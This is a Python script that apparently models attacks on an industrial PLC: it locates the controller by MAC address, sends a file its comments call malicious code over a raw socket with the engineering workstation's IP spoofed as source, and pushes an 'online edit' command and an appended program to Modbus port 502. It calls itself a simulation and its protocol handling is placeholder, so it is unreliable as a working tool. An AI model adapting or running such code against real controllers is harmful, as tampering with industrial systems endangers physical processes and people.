import socket
import struct
import time
import subprocess
import os

# Configuration - Adjust these based on your environment
PLC_MAC_ADDRESS = "00:11:22:33:44:55"  # Replace with the PLC's actual MAC address
ENGINEERING_WORKSTATION_IP = "192.168.1.100" # Replace with your engineering workstation's IP
SCRIPT_DIRECTORY = os.path.dirname(os.path.abspath(__file__))
PROGRAM_MODIFICATION_PAYLOAD_FILE = os.path.join(SCRIPT_DIRECTORY, "modified_program.bin") # Path to malicious code


#--- Helper Functions ---

def find_plc_ip(plc_mac_address):
    """
    Finds the PLC's IP address by scanning the network.
    Uses arp-scan to discover IP address associated with PLC_MAC_ADDRESS.
    """
    try:
        # Execute arp-scan (make sure it's installed)
        arp_scan_result = subprocess.check_output(["arp-scan", "-l", "--interface=eth0", "--mac", plc_mac_address], text=True) # adapt interface for your system
        # Parse the arp-scan output to extract the IP address
        for line in arp_scan_result.splitlines():
            if plc_mac_address in line:
                parts = line.split()
                if len(parts) > 1:
                    return parts[0]  # Return the IP address
        return None  # PLC not found
    except subprocess.CalledProcessError as e:
        print(f"Error running arp-scan: {e}")
        return None
    except FileNotFoundError:
        print("arp-scan not found.  Please install it (e.g., `sudo apt-get install arp-scan`).")
        return None

def program_download(plc_ip, program_payload_file):
    """
    Simulates a program download to the PLC.
    This is a simplified example and may require adaptation depending on the PLC's protocol.
    It assumes a raw socket connection and a specific payload format.
    """
    try:
        with open(program_payload_file, "rb") as f:
            program_data = f.read()
    except FileNotFoundError:
        print(f"Error: Payload file not found: {program_payload_file}")
        return False

    try:
        # Create a raw socket
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

        # Craft the IP header (minimal)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                 0x45,  # Version and IHL
                                 0x00,  # DSCP and ECN
                                 20 + len(program_data),  # Total length (IP header + payload)
                                 0,     # Identification
                                 0x4000, # Flags and Fragment Offset
                                 64,    # TTL
                                 socket.IPPROTO_RAW, # Protocol (RAW)
                                 0,     # Checksum (should be calculated, but can be 0 for testing)
                                 socket.inet_aton(ENGINEERING_WORKSTATION_IP),  # Source IP (spoofed)
                                 socket.inet_aton(plc_ip)) # Destination IP

        # Combine header and payload
        packet = ip_header + program_data

        # Send the packet
        s.sendto(packet, (plc_ip, 0)) # Destination port doesn't matter for RAW sockets

        print(f"Program download initiated to {plc_ip} using payload from {program_payload_file}.")
        return True

    except socket.error as e:
        print(f"Socket error: {e}")
        return False
    finally:
        if 's' in locals():  # Close the socket if it was created
            s.close()


def online_edit(plc_ip, edit_payload):
    """
    Simulates an online edit to the PLC program.  Highly simplified.
    This function assumes a simple string-based protocol. Replace with the
    actual protocol used by the PLC.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((plc_ip, 502))  # Example Modbus port. Adjust as needed.
        print(f"Connected to PLC at {plc_ip} on port 502")

        s.sendall(edit_payload.encode())  # Send the edit command
        print("Online edit payload sent.")

        response = s.recv(1024)  # Receive response (adjust buffer size)
        print(f"Response from PLC: {response.decode()}")

    except socket.error as e:
        print(f"Socket error during online edit: {e}")
        return False
    finally:
        if 's' in locals():
            s.close()

    return True

def program_append(plc_ip, append_payload_file):
    """
    Simulates appending code to an existing PLC program.
    This is a placeholder. You'll need to implement the actual append logic
    based on the PLC's protocol.  This example is TCP based.
    """

    try:
        with open(append_payload_file, "rb") as f:
            append_data = f.read()
    except FileNotFoundError:
        print(f"Error: Append payload file not found: {append_payload_file}")
        return False

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((plc_ip, 502)) #Example Modbus Port. Adjust as needed.
        print(f"Connected to PLC at {plc_ip} on port 502 for append")
        s.sendall(append_data)
        print("Append payload sent.")
        response = s.recv(1024)  # Adjust buffer size
        print(f"Response from PLC (append): {response.decode()}")


    except socket.error as e:
        print(f"Socket error during program append: {e}")
        return False
    finally:
        if 's' in locals():
            s.close()
    return True


#--- Main Script ---

if __name__ == "__main__":

    plc_ip_address = find_plc_ip(PLC_MAC_ADDRESS)

    if plc_ip_address:
        print(f"PLC IP Address: {plc_ip_address}")
    else:
        print("Could not find PLC IP address.  Exiting.")
        exit(1)

    # --- Simulate Different Modification Techniques ---

    # 1. Program Download (Requires creating a 'modified_program.bin' file)
    print("\n--- Simulating Program Download ---")
    if program_download(plc_ip_address, PROGRAM_MODIFICATION_PAYLOAD_FILE):
        print("Program download successful (simulated).")
    else:
        print("Program download failed.")

    # 2. Online Edit (Example payload - adapt for your PLC)
    print("\n--- Simulating Online Edit ---")
    online_edit_payload = "MODIFY_VARIABLE=TRUE"  # Example: Set a variable
    if online_edit(plc_ip_address, online_edit_payload):
        print("Online edit successful (simulated).")
    else:
        print("Online edit failed.")

    # 3. Program Append (Requires an 'append_program.bin' file)
    print("\n--- Simulating Program Append ---")
    append_program_file = os.path.join(SCRIPT_DIRECTORY, "append_program.bin")
    if program_append(plc_ip_address, append_program_file):
        print("Program append successful (simulated).")
    else:
        print("Program append failed.")

    print("\nScript execution complete.")